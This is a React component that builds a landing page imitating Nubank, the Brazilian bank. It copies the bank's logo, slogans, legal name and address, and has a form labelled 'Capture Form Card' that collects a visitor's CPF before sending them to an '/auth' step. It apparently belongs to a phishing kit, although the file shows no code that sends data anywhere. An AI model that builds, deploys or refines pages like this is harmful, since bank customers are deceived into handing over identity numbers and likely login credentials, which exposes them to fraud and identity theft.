import { useNavigate } from 'react-router-dom'
import { Search, ChevronRight } from 'lucide-react'
import { useState } from 'react'
import bannerImg from '../assets/banner.jpg'
import logoImg from '../assets/logo.png'

export default function Landing() {
  const navigate = useNavigate()
  const [cpf, setCpf] = useState('')

  const handleCpfChange = (e) => {
    let value = e.target.value.replace(/\D/g, '')
    if (value.length > 11) value = value.slice(0, 11)
    if (value.length > 9) {
      value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4')
    } else if (value.length > 6) {
      value = value.replace(/(\d{3})(\d{3})(\d{3})/, '$1.$2.$3')
    } else if (value.length > 3) {
      value = value.replace(/(\d{3})(\d{3})/, '$1.$2')
    }
    setCpf(value)
  }

  return (
    <div className="min-h-dvh bg-white flex flex-col font-sans select-none overflow-x-hidden">
      {/* Official Header */}
      <header className="px-5 py-4 flex items-center justify-between border-b border-gray-100 bg-white/95 backdrop-blur-md sticky top-0 z-[100]">
        <div className="flex items-center gap-1 shrink-0">
          <img src={logoImg} alt="nu" className="h-[28px] w-auto" />
        </div>
        
        <div className="flex items-center justify-center flex-grow mx-2">
          <button className="bg-[#820AD1] hover:bg-[#9436E1] text-white text-[12px] md:text-[14px] font-bold px-4 py-2 md:px-6 md:py-3 rounded-full transition-all active:scale-95 shadow-lg shadow-purple-200">
            Quero ser Nubank
          </button>
        </div>

        <div className="flex items-center gap-4 text-[#820AD1] shrink-0">
          <Search className="w-6 h-6 stroke-[2.5]" />
          <div className="flex flex-col gap-[3px]">
            <div className="w-7 h-[3px] bg-[#820AD1] rounded-full"></div>
            <div className="w-7 h-[3px] bg-[#820AD1] rounded-full"></div>
          </div>
        </div>
      </header>

      {/* Main Content Section */}
      <main className="relative flex flex-col flex-grow">
        
        {/* Full Screen Banner Img */}
        <div className="relative w-full aspect-[4/5] md:aspect-video lg:h-[80dvh]">
          <img 
            src={bannerImg} 
            alt="Nubank Hero" 
            className="w-full h-full object-cover"
          />
          {/* Subtle Contrast Overlays */}
          <div className="absolute inset-x-0 bottom-0 h-1/2 bg-gradient-to-t from-black/20 to-transparent pointer-events-none" />

          {/* Hero Text Over Banner */}
          <div className="absolute inset-0 px-8 flex flex-col pt-40 md:pt-32">
            <h1 className="text-[40px] md:text-[64px] font-extrabold text-white leading-[1.05] tracking-tight drop-shadow-md max-w-[340px] md:max-w-[600px]">
              Somos incansáveis pra você não precisar ser
            </h1>
            
            <button className="mt-8 bg-[#820AD1] hover:bg-[#9436E1] text-white font-bold text-[15px] py-4 px-10 rounded-full w-fit shadow-xl transition-all active:scale-[0.97]">
              Faz valer
            </button>
          </div>
        </div>

        {/* Capture Form Card - Negative Margin to float above banner */}
        <div className="px-5 -mt-10 md:-mt-20 relative z-50 mb-12">
           <div className="bg-white rounded-[40px] p-8 md:p-12 shadow-[0_20px_60px_rgba(0,0,0,0.1)] border border-gray-50 max-w-[480px] mx-auto transition-transform hover:scale-[1.01]">
              <h2 className="text-[20px] md:text-[24px] font-bold text-gray-900 leading-tight mb-10 text-center">
                Peça seu Cartão de Crédito e <br className="hidden md:block" /> sua Conta do Nubank
              </h2>

              <div className="space-y-8">
                {/* Input Container */}
                <div className="relative group">
                  <input 
                    type="text" 
                    value={cpf}
                    onChange={handleCpfChange}
                    placeholder="Digite seu CPF"
                    className="w-full bg-[#F5F5F7] border-b-[2px] border-transparent p-5 rounded-2xl text-[16px] font-medium text-gray-700 placeholder:text-gray-400 focus:outline-none focus:bg-[#efeff1] focus:border-[#820AD1] transition-all group-hover:bg-[#efeff1]"
                  />
                </div>

                {/* Submit Action */}
                <button
                  disabled={cpf.length < 14}
                  onClick={() => navigate('/auth')}
                  className="w-full group bg-[#820AD1] disabled:opacity-40 hover:bg-[#9436E1] text-white font-bold text-[17px] py-[22px] rounded-[32px] transition-all active:scale-[0.98] shadow-2xl shadow-purple-600/20 flex items-center justify-center gap-2"
                >
                  Continuar
                  <ChevronRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
                </button>
              </div>
           </div>
        </div>
      </main>

      {/* Modern Compact Footer */}
      <footer className="bg-white py-12 px-8 flex flex-col items-center gap-6 border-t border-gray-50">
          <div className="flex gap-10 opacity-60 text-gray-500 font-bold text-[11px] uppercase tracking-widest">
            <span>Privacidade</span>
            <span>Segurança</span>
            <span>Ajuda</span>
          </div>
          <p className="text-[10px] font-medium text-gray-400 max-w-[280px] text-center leading-relaxed">
            © 2024 Nu Pagamentos S.A. <br />
            Rua Capote Valente, 39 - Pinheiros, São Paulo/SP
          </p>
      </footer>
    </div>
  )
}
